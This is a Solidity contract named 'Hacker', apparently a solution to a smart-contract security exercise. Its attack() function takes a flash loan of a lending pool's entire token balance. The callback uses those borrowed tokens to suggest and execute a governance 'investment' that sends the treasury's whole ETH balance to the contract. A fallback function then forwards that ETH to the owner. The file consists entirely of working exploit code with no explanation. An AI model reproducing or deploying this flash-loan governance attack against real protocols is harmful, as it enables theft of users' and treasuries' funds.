pragma solidity ^0.8.13;

import "@openzeppelin/contracts/access/Ownable.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "hardhat/console.sol";

interface ILendingPool {
    function flashLoan(uint256 borrowAmount) external;
}

interface IGovernance {
    function suggestInvestment(
        address _startup,
        uint256 _amount
    ) external returns (uint256);

    function executeInvestment(uint256 investmentId) external;
}

contract Hacker is Ownable {
    IERC20 token;

    address lendingPool;
    address governance;
    address treasury;

    uint balanceOfLendingPool;

    constructor(
        address _token,
        address _lendingPool,
        address _governance,
        address _treasury
    ) {
        token = IERC20(_token);
        lendingPool = _lendingPool;
        governance = _governance;
        treasury = _treasury;
    }

    function attack() external {
        console.log("FlashLoan called");
        balanceOfLendingPool = token.balanceOf(lendingPool);
        ILendingPool(lendingPool).flashLoan(balanceOfLendingPool);
        console.log("FlashLoan repaid");
    }

    function callBack(uint borrowAmount) external {
        uint investmentId = IGovernance(governance).suggestInvestment(
            address(this),
            treasury.balance
        );
        console.log("Suggest Investment successfully called");

        IGovernance(governance).executeInvestment(investmentId);
        console.log("Execute Investment successfully called");

        bool success = token.transfer(lendingPool, borrowAmount);
        require(success);
    }

    fallback() external payable {
        console.log("Money's comming ");

        (bool success, ) = owner().call{value: address(this).balance}("");
        require(success);
    }
}
